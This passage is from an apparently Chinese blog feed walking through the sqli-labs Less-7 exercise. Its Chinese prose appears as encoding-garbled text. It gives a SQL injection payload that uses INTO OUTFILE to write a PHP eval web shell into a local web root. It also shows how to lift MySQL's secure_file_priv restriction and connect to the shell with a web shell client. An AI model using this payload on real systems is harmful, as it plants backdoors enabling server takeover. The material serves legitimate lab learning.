alt="GRh75D.png"></p><p>å°è¯•å†™å…¥æ–‡ä»¶ï¼š</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_POST["pwd"]);?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"E:\\PhpStudy2018\\PHPTutorial\\WWW\\hack.php"</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>æ³¨ï¼šæ­¤å¤„ç”¨<code>\\</code>å¦åˆ™,å†™å…¥çš„æ–‡ä»¶åä¼šéå¸¸é•¿ï¼Œä¸ºè·¯å¾„+æ–‡ä»¶åçš„ç»„åˆå½¢å¼ï¼›</p><p>å‘ç°å“åº”ä½ç½®å¹¶æ²¡æœ‰æˆ‘ä»¬è®¡åˆ’è¦å†™å…¥çš„å†…å®¹ï¼Œå³è¡¨ç¤ºæ­¤æ—¶æˆ‘ä»¬æ²¡æœ‰æƒé™å¯¼å…¥/å¯¼å‡ºï¼›</p><p><strong>MySQLé»˜è®¤æ²¡æœ‰æƒé™å¯¼å…¥/å¯¼å‡ºæ–‡ä»¶ï¼Œè¯¥æƒé™ä¸secure_file_privæœ‰å…³,é»˜è®¤ä¸ºNULLï¼Œå³ä¸å…è®¸å¯¼å…¥å¯¼å‡ºï¼›</strong></p><p><strong>secure-file-privç‰¹æ€§</strong><br>secure-file-privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT â€¦ OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚</p><ul><li>ure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º</li><li>å½“secure_file_privçš„å€¼ä¸º/tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹</li><li>å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</li></ul><p>æŸ¥çœ‹secure-file-privå‚æ•°çš„å€¼ï¼š                        </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/08/GRhoVK.png" alt="GRhoVK.png"></p><p>å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯phpstudy,æ•…åœ¨å…¶ç›®å½•ä¸‹çš„MySQLä¸‹ï¼Œåœ¨my.iniæ–‡ä»¶é‡ŒåŠ ä¸Šsecure_file_priv=â€˜â€™ï¼ˆ<strong>è‹±æ–‡</strong>å•å¼•å·/åŒå¼•å·/ä»€ä¹ˆéƒ½ä¸åŠ ï¼‰ï¼Œæ­¤æ—¶è¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶,é‡å¯phpstudyå³å¯ï¼›</p><p>å°è¯•å†™å…¥æ–‡ä»¶ï¼š</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_POST["pwd"]);?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"E:\\PhpStudy2018\\PHPTutorial\WWW\\hack.php"</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åœ¨ç›¸åº”çš„ç›®å½•ä¸‹å·²ç»å‡ºç°äº†æˆ‘ä»¬è®¡åˆ’å†™å…¥çš„æ–‡ä»¶ï¼›</p><p>æ³¨ï¼šå½“æ–‡ä»¶åé‡å¤æ—¶ï¼ŒæŒ‡ä»¤ä¸ä¼šå†æ¬¡æ‰§è¡Œï¼Œå³ä¸ä¼šè¦†ç›–åŸæ¥é‡åæ–‡ä»¶ï¼›</p><p><img src="https://s1.ax1x.com/2020/04/08/GRhTUO.png" alt="GRhTUO.png"></p><p>æŸ¥çœ‹å†™å…¥æ–‡ä»¶å†…å®¹ï¼š</p><p><img src="https://s1.ax1x.com/2020/04/08/GRhOxA.png" alt="GRhOxA.png"></p><p>+++</p><p>æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨èœåˆ€è¿æ¥äº†ï¼›</p><p>ç”±payloadå¯çŸ¥æˆ‘ä»¬æŠŠæ–‡ä»¶å†™åœ¨äº†ç«™ç‚¹æ ¹ç›®å½•é‡Œäº†ï¼Œæ‰€ä»¥è¿æ¥èœåˆ€åªéœ€å†™å¦‚ä¸‹å†…å®¹ï¼š</p><p><code>http://</code>127.0.0.1/hack.php</p><p><img src="https://s1.ax1x.com/2020/04/08/GRhvrt.png" alt="GRhvrt.png"></p><p>+++</p><p>æ›´æ–°(2020.08.04):</p><p>æ¥åº·åº·æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You have an error in your SQL syntax'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹è¿™è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></table></figure><p>ä¸æŠ¥é”™çš„åŸå› ä¸ºæ³¨é‡Šäº†æ‰“å°æŠ¥é”™çš„è¯­å¥ï¼›</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-7-GETæ–¹å¼-å¯¼å‡ºæ–‡ä»¶-string&quot;&gt;&lt;a href=&quot;#Less-7-GETæ–¹å¼-å¯¼å‡ºæ–‡ä»¶-string&quot; class=&quot;headerlink&quot; title=&quot;Less-7(GETæ–¹å¼-å¯¼å‡ºæ–‡ä»¶-string)&quot;&gt;&lt;/a&gt;Less-7(GETæ–¹å¼-
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
</feed>
